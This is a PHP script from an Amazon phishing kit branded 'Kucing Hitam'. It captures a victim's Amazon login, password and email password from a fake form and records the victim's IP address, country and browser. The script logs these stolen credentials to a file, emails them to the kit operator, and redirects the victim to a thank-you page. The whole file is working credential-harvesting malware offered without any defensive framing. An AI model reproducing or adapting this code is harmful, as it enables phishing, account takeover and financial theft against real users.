<?php

/*
+-=[K]ucing[H]itam[S]hop=-+
*/

session_start();
$randomnumber = rand(1,100);

include('../__CONFIG__.php');
require('../detect.php');
require('../detek.php');

if (isset($_POST['Sex']))
{

	$_SESSION['EM'] = $_POST['EM'];
	$_SESSION['PW'] = $_POST['PW'];
    $_SESSION['EPW'] = $_POST['EPW'];

$message=
"[+] ========. [ $$ Kucing Hitam $$ ] .======= [+]

----------------Account Amazon--------------------
Account          : ".$_SESSION['EM']."|".$_SESSION['PW']."
Password         : ".$_SESSION['PW']."
Email Password   : ".$_SESSION['EPW']."
--------------------PC Info-----------------------
IP         : ".$ip." | ".$nama_negara."
Browser    : ".$_SERVER['HTTP_USER_AGENT']."
[+] ========. [ $$ Silent Is Gold $$ ] .====== [+]
";
    $save = fopen("../../log/backup_tembus.txt", "a+");
    fwrite($save, $message);
    fclose($save);
    $file2 = "../../log/tembus.txt";
    $isi  = @file_get_contents($file2);
    $buka = fopen($file2,"w"); 
    fwrite($buka, $isi+1);
    fclose($buka);
    $headers = "From: Email Login  <amazonACC-$randomnumber@kucinghitam.team>";
    $subject = "Tembus Email [ ".$ip." - ".$nama_negara."] - [".$contin_name."]";
	mail($to, $subject, $message, $headers);

	header('Location: ../Thanks.php?udm_cat_path='.sha1(time()));
}
else
{
	# code...
}
  ?>